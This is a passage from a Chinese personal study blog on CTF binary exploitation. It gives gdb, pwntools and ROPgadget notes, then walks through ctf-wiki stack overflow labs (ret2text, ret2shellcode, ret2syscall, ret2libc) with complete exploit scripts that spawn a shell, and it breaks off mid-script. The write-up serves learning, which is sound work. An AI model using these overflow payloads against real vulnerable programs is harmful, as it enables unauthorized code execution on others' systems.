指定地址处下断点，&lt;地址&gt;例子：0x08048648</span></span><br><span class="line">pwndbg&gt; x/130wx &lt;地址&gt;       <span class="comment"># 打印栈上信息，此处&lt;地址&gt;常用esp指向的栈地址</span></span><br><span class="line">pwndbg&gt; i b         <span class="comment">#info break，查看所有断点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不常用</span></span><br><span class="line">pwndbg&gt; c           <span class="comment">#continue，运行至下一断点</span></span><br><span class="line">pwndbg&gt; d           <span class="comment">#delete  ，通常用来删除所有断点，也可以删除指定编号的各类型断点</span></span><br><span class="line">pwndbg&gt; disass      <span class="comment">#~~emble ，反汇编，disassemble main，disassemble /r main</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#暂未用到过的</span></span><br><span class="line">pwndbg&gt; l           <span class="comment">#list    ，显示源程序代码的内容，包括各行代码所在的行号。</span></span><br><span class="line">pwndbg&gt; <span class="keyword">fi</span>          <span class="comment">#finish  ，结束当前正在执行的函数，并在跳出函数后暂停程序的执行。</span></span><br><span class="line">pwndbg&gt; j           <span class="comment">#jump    ，使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码。</span></span><br><span class="line">pwndbg&gt; q           <span class="comment">#quit    ，终止调试。</span></span><br><span class="line">pwndbg&gt; u           <span class="comment">#until   ，百度去搜</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#高级用法--------下面这一部分记录的比较乱，没办法，之前没接触过</span></span><br><span class="line"><span class="comment"># http://c.biancheng.net/view/8238.html</span></span><br><span class="line"><span class="comment"># https://www.cnblogs.com/zuoanfengxi/p/12763350.html</span></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="variable">$eip</span> = 0x8048300    <span class="comment">#设置寄存器eip的值</span></span><br><span class="line">pwndbg&gt; p <span class="variable">$eip</span>                  <span class="comment">#打印</span></span><br><span class="line">pwndbg&gt; x/i <span class="variable">$eip</span>                <span class="comment">#把地址处存的值按照汇编来解析，打印出来</span></span><br></pre></td></tr></table></figure><br/><br/><h1 id="exp编写记录"><a href="#exp编写记录" class="headerlink" title="exp编写记录"></a>exp编写记录</h1><p>宝藏博客：<a href="https://lantern.cool/note-tool-pwntools/#context">Pwntools | Lantern’s 小站</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##-----------------------------------基本实用操作---------------------------------------##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##!/usr/bin/env python  #python文本标识头</span></span><br><span class="line">from pwn import *  <span class="comment">#导入pwntools中的所有模块</span></span><br><span class="line">from LibcSearcher import *        <span class="comment">#导入LibcSearcher中的所有模块</span></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-     or    # coding:utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以上四句，写exp的时候加进首部就行了，前两句必加，第四句不加的话你的代码中就不能出现任何中文，注释也一样，否则会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#连接：</span></span><br><span class="line">sh = process(<span class="string">&#x27;本地文件&#x27;</span>)      <span class="comment">#创建本地连接</span></span><br><span class="line">sh = remote(<span class="string">&quot;ip地址&quot;</span>，端口号)  <span class="comment">#远程</span></span><br><span class="line">sh.close()                   <span class="comment">#关闭连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ELF文件操作</span></span><br><span class="line">&gt;&gt;&gt; e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line">(e.address)  <span class="comment"># 文件装载的基地址</span></span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> hex(e.symbols[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># 函数地址</span></span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> hex(e.got[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># GOT表的地址</span></span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> hex(e.plt[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># PLT的地址</span></span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> hex(e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next())<span class="comment"># 字符串/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#I/O模块</span></span><br><span class="line">sh.send(data)                <span class="comment">#发送数据</span></span><br><span class="line">sh.sendline(data)            <span class="comment">#发送一行数据，相当于在数据后面加\n</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;字符串&#x27;</span>,data)<span class="comment">#在遇到字符串后发送数据      </span></span><br><span class="line">sh.interactive()             <span class="comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#其他</span></span><br><span class="line">buf2_addr = 0x804a080        <span class="comment">#定义变量并为其赋值</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;字符串&#x27;</span>)         <span class="comment">#遇到相同字符串后再进行下一条指令（通常为sendline）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#结束</span></span><br><span class="line">p.interactive()              <span class="comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##-----------------------------------基本实用操作---------------------------------------##</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##-----------------------------------花里胡哨操作---------------------------------------##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#等效替代</span></span><br><span class="line">ru=lambda x:io.recvuntil(x)</span><br><span class="line">rl=lambda :io.recvline()</span><br><span class="line">sla=lambda x,y:io.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##-----------------------------------花里胡哨操作---------------------------------------##</span></span><br></pre></td></tr></table></figure><br/><br/><h1 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#遇见一个收录一个</span></span><br><span class="line">$ objdump -dj .plt ret2libc2<span class="comment">#查看ret2libc2文件的plt表</span></span><br><span class="line">$ objdump -h &lt;可执行文件&gt;            <span class="comment">#查看所有节，并节选所需内容</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><h1 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#遇则收录</span></span><br><span class="line">$ ROPgadget --binary ret2libc2 --only <span class="string">&quot;pop|ret&quot;</span><span class="comment">#查找文件中的pop或ret字段</span></span><br></pre></td></tr></table></figure><br/><p>———————————————————————-分界线———————————————————————————————————–</p><br/><h1 id="ctf-wiki-pwn"><a href="#ctf-wiki-pwn" class="headerlink" title="ctf-wiki-pwn"></a><center><font color="red">ctf-wiki-pwn</font></center></h1><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>知识点：pwn相关的一些小技巧，偏移寻找、cyclic</p><p>注：个人笔记，重在个人对知识点的复习。</p><p>解题思路：存在 system(“/bin/sh”);  利用溢出修改ret指令处的地址控制程序跳转过去</p><p>原文链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">ctf-wiki-ret2text</a></p><p>点击下载：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwn相关的一些小技巧</span></span><br><span class="line">$ file &lt;文件名&gt;        <span class="comment">#查看文件信息   </span></span><br><span class="line">$ checksec &lt;文件名&gt;    <span class="comment">#查看文件的保护机制  </span></span><br><span class="line">$ gdb &lt;文件名&gt;         <span class="comment">#gdb调试文件</span></span><br><span class="line">ida中 tab、空格、<span class="built_in">shift</span>+f12、Imports栏框</span><br><span class="line">gdb中 b *&lt;地址&gt;、ni、x/136wx &lt;esp指向的栈地址&gt;、info registers查看寄存器值</span><br><span class="line">python中 from pwn import * 、cyclic()、cyclic_find()</span><br><span class="line"></span><br><span class="line">$ x/136wx 0xffffd0d0  <span class="comment">#比较常用也比较容易忘</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解题过程</span></span><br><span class="line">1、$ file ret2text       <span class="comment">#得知文件为32位可执行文件</span></span><br><span class="line">2、$ checksc ret2text    <span class="comment">#查看文件保护机制，未开启任何保护(说明有很多思路可以使用)</span></span><br><span class="line">3、打开32位ida查询主函数，发现gets()函数(存在栈溢出)</span><br><span class="line">4、在secure函数中查找到 system(<span class="string">&quot;/bin/sh&quot;</span>); 字样，得到其位置0x0804863A</span><br><span class="line">5、gdb调试查找偏移值，计算得偏移值112</span><br><span class="line">6、编写解题脚本</span><br></pre></td></tr></table></figure><br/><p>4、函数窗口中点击secure函数，tab键（+空格键）得到如下界面。</p><p><img src="image-20220321190453216.png" alt="image-20220321190453216"></p><br/><p>5、偏移值计算</p><p><img src="image-20220321191631835.png" alt="image-20220321191631835"></p><p>单走ni到达gets()函数，如下：</p><p><img src="image-20220321191935613.png" alt="image-20220321191935613"></p><p>新建命令行，打开python，导入pwntools中的所有模块，cyclic()生成200个较有规律的随机字符并输入到上图中的程序中，如下：</p><p><img src="image-20220321192237309.png" alt="image-20220321192237309"></p><p><img src="image-20220321192458522.png" alt="image-20220321192458522"></p><p>由上图的值ebp指向的是栈的0xffffd158位置，我们利用$ x/136wx 0xffffd0d0（0xffffd0d0是esp指向的栈位置，栈是从高地址向低地址生长的所以esp在ebp的下方，这句指令的意思是从0xffffd0d0开始向高地址按每个数据4字节打印136个数据）打印栈上信息，如下：</p><p><img src="image-20220321194457925.png" alt="image-20220321194457925"></p><p>上图中的0x62616163就是我们ebp指向的栈上存储的信息，翻译成字符就是baac，但由于内存小端序存值的原因，我们需倒序，因此要查找的字符为caab，我们回到python中查询caab字符串的位置，如下：</p><p><img src="image-20220321194801166.png" alt="image-20220321194801166"></p><p>因此从我们输入的第一个字符到ebp的初始位置相距108个字符，而我们的ret指令在ebp的上一个位置（为什么ebp的上一个位置为ret指令？自学下汇编，自己写个简单的程序反编译分析一下你就知道了），而我们要把  system(“/bin/sh”);  的位置地址 0x0804863A 覆盖到ret指令调用的栈位置（ret指令执行时就从该栈位置出取处地址并跳转过去），所以还要+4个字节（ebp占用4字节）即112个字符。</p><p>最后我们构造的payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = 0x804863a</span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * 112 + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>注：之后的题解不会写得如此详细，因为是个人笔记，重在个人复习，所以一些特别基础的知识及操作之后不再写出。（倘若碰巧你也是个pwn的初学者，欢迎找我讨论）</p><br/><br/><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>知识点：shellcode植入 、asm(shellcraft.sh()) 、ljust()</p><p>解题思路：.bss段可执行，且存在将输入值copy到.bss段的函数，借助溢出执行shellcode</p><p>原文链接: <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">ctf-wiki-ret2shellcode</a></p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">解题步骤：</span><br><span class="line">1、ida：</span><br><span class="line">    <span class="comment">#ida查看main函数分析，存在gets()函数，栈溢出</span></span><br><span class="line">    <span class="comment">#发现strncpy()函数将输入的字符串复制到了buf2处，跟进buf2</span></span><br><span class="line">    <span class="comment">#发现buf2存在与.bss段</span></span><br><span class="line">    <span class="comment">#记录.bss段的起始地址：0x0804A040-0x0804A080</span></span><br><span class="line"></span><br><span class="line">2、gdb:</span><br><span class="line">    <span class="comment">#$ vmmap查看当前程序的系统调用库，发现.bss所在段具有可执行权限</span></span><br><span class="line">    <span class="comment">#说明可以利用溢出跳转至.bss段处，再由系统执行.bss处被copy过去的shellcode</span></span><br><span class="line">    <span class="comment">#注：我们的输入值会由strncpy()函数copy给buf2，而buf2在.bss段上</span></span><br><span class="line">    <span class="comment">#偏移计算，偏移值为112个字符</span></span><br><span class="line">    </span><br><span class="line">3、编写解题脚本</span><br><span class="line">    <span class="comment">#利用asm(shellcraft.sh())生成shellcode</span></span><br><span class="line">    <span class="comment">#shellcode.ljust(112, &#x27;A&#x27;)将shellcode填充为112个字符长度的字符串</span></span><br><span class="line">    <span class="comment">#注：ljust()用于字符串填充</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解题脚本如下：</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(112, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br/><br/><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>知识点：系统调用、寻找 gadgets 的方法</p><p>原文链接: <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">ctf-wiki-ret2syscall</a></p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#知识点补充</span></span><br><span class="line">系统调用：</span><br><span class="line">int 0x80进入内核模式（与之对应的是用户模式），进入内核模式后，</span><br><span class="line">系统会根据相应寄存器的值判定要进行什么样的系统调用</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">这里就对ctf-wiki上的execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)例子进行更通俗的解释：</span><br><span class="line">若在执行int 0x80前做到以下三点，就相当于执行了execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)指令</span><br><span class="line">eax的值变为0xb</span><br><span class="line">ebx的值为/bin/sh的地址</span><br><span class="line">ecx和edx的值变为0</span><br><span class="line"></span><br><span class="line">注：一般eax存储系统调用号，从以上的例子也可以看出</span><br><span class="line">ebx、ecx、edx分别存储<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL三个参数</span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">解题步骤：</span><br><span class="line">1、ida分析源码</span><br><span class="line">2、gdb计算偏移，112</span><br><span class="line">3、寻找控制 eax 的 gadgets：</span><br><span class="line">      指令：ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br><span class="line">      选取：0x080bb196 : pop eax ; ret</span><br><span class="line">4、寻找控制其它寄存器的 gadgets</span><br><span class="line">      指令：ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">      选取：0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">5、查找 /bin/sh 字符串对应的地址</span><br><span class="line">      指令：ROPgadget --binary rop  --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">      选取：0x080be408 : /bin/sh</span><br><span class="line">6、查找 int 0x80 的地址</span><br><span class="line">      指令：ROPgadget --binary rop  --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">      选取：0x08049421 : int 0x80</span><br><span class="line">7、编写解题脚本</span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解题脚本如下：</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>注：flat()用于标准化数据，相当于将flat中的每个数据外套上p32()</p><p>注：栈上数据的跳转实现，有空模拟一下</p><br/><br/><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>__不可错过的一篇博客：__<a href="https://blog.csdn.net/qq_40827990/article/details/86662079">https://blog.csdn.net/qq_40827990/article/details/86662079</a></p><br/><h5 id="例1：ret2libc1"><a href="#例1：ret2libc1" class="headerlink" title="例1：ret2libc1"></a>例1：ret2libc1</h5><p>知识点：system 函数与 /bin/sh 字符串分离，栈分析</p><p>原文链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc">ctf-wiki-ret2libc</a></p><p>点击下载：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#解题脚本</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line"></span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解题步骤：</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * 112, system_plt, <span class="string">&#x27;b&#x27;</span> * 4, binsh_addr])</span><br><span class="line">主要是搞懂中间为什么要隔4个字符，执行完每步汇编后栈上的值的情况怎样</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push    <span class="comment">#先减esp，再压入</span></span><br><span class="line">pop     <span class="comment">#先取数据再增esp</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">函数头：</span><br><span class="line">push   ebp              <span class="comment">#esp下移四个字节(32位寄存器大小)，</span></span><br><span class="line">                            <span class="comment">#上一栈帧ebp值入栈</span></span><br><span class="line"></span><br><span class="line">mov    ebp,esp          <span class="comment">#esp值赋给ebp，即将ebp指向esp位置</span></span><br><span class="line"></span><br><span class="line">and    esp,FFFFFFF0h    <span class="comment">#esp加一个极大值，溢出部分忽略，</span></span><br><span class="line">                            <span class="comment">#相当于减了一个F，即esp下移F个位置</span></span><br><span class="line"></span><br><span class="line">函数尾：</span><br><span class="line">leave：等价于</span><br><span class="line">mov    esp,ebp</span><br><span class="line"></span><br><span class="line">pop    ebp          <span class="comment">#取出esp指向的栈位置处的数据赋给ebp，</span></span><br><span class="line">                            <span class="comment">#再将esp上移四个字节</span></span><br><span class="line"></span><br><span class="line">retn:</span><br><span class="line">pop    eip          <span class="comment">#取出esp指向的栈位置处的数据赋给eip，</span></span><br><span class="line">                            <span class="comment">#再将esp上移四个字节</span></span><br><span class="line"></span><br><span class="line">jmp    eip          <span class="comment">#跳转到eip寄存器中存储的地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">所以我们可以看到，一个函数尾，会先从栈上取一个值赋给esp再取一个值赋给eip，</span><br><span class="line">结合下方图片记录，好好理一遍，应该就能搞懂中间为什么要隔4个字符了。</span><br></pre></td></tr></table></figure><p>图片记录(.\PWN\ )：</p><p><img src="image-20220321212743720.png" alt="image-20220321212743720"></p><p><img src="image-20220321212728076.png" alt="image-20220321212728076"></p><p><img src="image-20220321212714333.png" alt="image-20220321212714333"></p><p><img src="image-20220321212317869.png" alt="image-20220321212317869"></p><p><img src="image-20220321212258169.png" alt="image-20220321212258169"></p><br/><br/><hr><hr><hr><h5 id="例2：ret2libc2"><a href="#例2：ret2libc2" class="headerlink" title="例2：ret2libc2"></a>例2：ret2libc2</h5><p>知识点：got表、plt表</p><p>原文链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2">ctf-wiki-ret2libc2</a></p><p>点击下载：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p><h5 id="例3：ret2libc3"><a href="#例3：ret2libc3" class="headerlink" title="例3：ret2libc3"></a>例3：ret2libc3</h5><p>原文链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3">ctf-wiki-ret2libc3</a></p><p>点击下载：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#LibcSearcher的安装</span></span><br><span class="line">    $ git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">    $ <span class="built_in">cd</span> LibcSearcher</span><br><span class="line">    $ python setup.py develop</span><br></pre></td></tr></table></figure><p>推荐题解：<a href="https://blog.csdn.net/qq_40827990/article/details/86662079">https://blog.csdn.net/qq_40827990/article/details/86662079</a></p><p>解题思路：</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入模块</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动程序</span></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印调试信息</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>          </span><br><span class="line"></span><br><span class="line"><span class="comment">#记录地址</span></span><br><span class="line">start_addr = 0x80484d0</span><br><span class="line">puts_plt_addr = 0x8048460</span><br><span class="line">libc_start_main_got_addr = 0x804a024</span><br><span class="line"></span><br><span class="line"><span class="comment">#遇到指定字符串暂停程序</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Can you find it !?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">p.sendline(<span class="string">&#x27;q&#x27;</span>*112 + 